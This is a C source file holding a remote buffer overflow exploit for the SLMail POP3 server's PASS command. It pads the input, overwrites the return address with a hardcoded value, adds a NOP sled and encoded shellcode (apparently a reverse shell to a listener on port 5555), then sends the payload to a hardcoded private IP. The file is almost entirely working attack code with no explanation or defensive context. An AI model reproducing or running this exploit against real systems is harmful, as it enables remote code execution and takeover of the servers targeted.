#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

/*#define retadd "\x8f\x35\x4a\x5f"*/
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

/*LHOST 5555*/
unsigned char shellcode[] = 
"\xdd\xc6\xd9\x74\x24\xf4\xb8\x49\x0b\x4c\xaa\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x8a\x0f\xae\x5f\xf0\xf8\xac"
"\xa0\x08\xf9\xd0\x29\xed\xc8\xd0\x4e\x66\x7a\xe1\x05\x2a\x77"
"\x8a\x48\xde\x0c\xfe\x44\xd1\xa5\xb5\xb2\xdc\x36\xe5\x87\x7f"
"\xb5\xf4\xdb\x5f\x84\x36\x2e\x9e\xc1\x2b\xc3\xf2\x9a\x20\x76"
"\xe2\xaf\x7d\x4b\x89\xfc\x90\xcb\x6e\xb4\x93\xfa\x21\xce\xcd"
"\xdc\xc0\x03\x66\x55\xda\x40\x43\x2f\x51\xb2\x3f\xae\xb3\x8a"
"\xc0\x1d\xfa\x22\x33\x5f\x3b\x84\xac\x2a\x35\xf6\x51\x2d\x82"
"\x84\x8d\xb8\x10\x2e\x45\x1a\xfc\xce\x8a\xfd\x77\xdc\x67\x89"
"\xdf\xc1\x76\x5e\x54\xfd\xf3\x61\xba\x77\x47\x46\x1e\xd3\x13"
"\xe7\x07\xb9\xf2\x18\x57\x62\xaa\xbc\x1c\x8f\xbf\xcc\x7f\xd8"
"\x0c\xfd\x7f\x18\x1b\x76\x0c\x2a\x84\x2c\x9a\x06\x4d\xeb\x5d"
"\x68\x64\x4b\xf1\x97\x87\xac\xd8\x53\xd3\xfc\x72\x75\x5c\x97"
"\x82\x7a\x89\x38\xd2\xd4\x62\xf9\x82\x94\xd2\x91\xc8\x1a\x0c"
"\x81\xf3\xf0\x25\x28\x0e\x93\x43\xa6\x10\x46\x3c\xba\x10\x9d"
"\x0f\x33\xf6\xf7\x7f\x12\xa1\x6f\x19\x3f\x39\x11\xe6\x95\x44"
"\x11\x6c\x1a\xb9\xdc\x85\x57\xa9\x89\x65\x22\x93\x1c\x79\x98"
"\xbb\xc3\xe8\x47\x3b\x8d\x10\xd0\x6c\xda\xe7\x29\xf8\xf6\x5e"
"\x80\x1e\x0b\x06\xeb\x9a\xd0\xfb\xf2\x23\x94\x40\xd1\x33\x60"
"\x48\x5d\x67\x3c\x1f\x0b\xd1\xfa\xc9\xfd\x8b\x54\xa5\x57\x5b"
"\x20\x85\x67\x1d\x2d\xc0\x11\xc1\x9c\xbd\x67\xfe\x11\x2a\x60"
"\x87\x4f\xca\x8f\x52\xd4\xfa\xc5\xfe\x7d\x93\x83\x6b\x3c\xfe"
"\x33\x46\x03\x07\xb0\x62\xfc\xfc\xa8\x07\xf9\xb9\x6e\xf4\x73"
"\xd1\x1a\xfa\x20\xd2\x0e";


 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2976);
    memset(buffer, 0x00, 2976);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(15);
    memset(nop, 0x00, 15);
    memset(nop, 0x90, 15);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.22.107");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}